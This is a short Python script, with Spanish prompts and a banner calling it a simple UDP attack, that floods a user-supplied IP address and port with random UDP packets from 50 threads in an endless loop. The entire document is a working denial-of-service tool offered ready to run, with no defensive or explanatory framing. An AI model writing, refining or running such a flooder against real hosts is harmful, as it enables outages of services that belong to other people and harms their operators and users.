import random
import socket
import threading
from colorama import Fore, Style

logo =f"""
{Fore.GREEN}
  _    _ _____  _____  
 | |  | |  __ \|  __ \ 
 | |  | | |  | | |__) |
 | |  | | |  | |  ___/ 
 | |__| | |__| | |     
  \____/|_____/|_| 
  Este es un ataque UDP simple
  {Fore.GREEN}
  """

print(logo)

objetivo = input(Fore.BLUE + "IP: " + Style.RESET_ALL)
puerto = int(input(Fore.BLUE + "PUERTO: " + Style.RESET_ALL))

hilos = 50
caracteres_hex = '0123456789abcdef'
cadena_hexadecimal = ''

for i in range(500):
    cadena_hexadecimal += random.choice(caracteres_hex)

def ataque():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    while True:
        try:
            sock.sendto(bytes.fromhex(cadena_hexadecimal), (objetivo, puerto))
            print(Fore.GREEN + f"Paquete enviado a IP: {objetivo} PUERTO: {puerto}")
        except:
            pass

for i in range(hilos):
    t = threading.Thread(target=ataque)
    t.start()
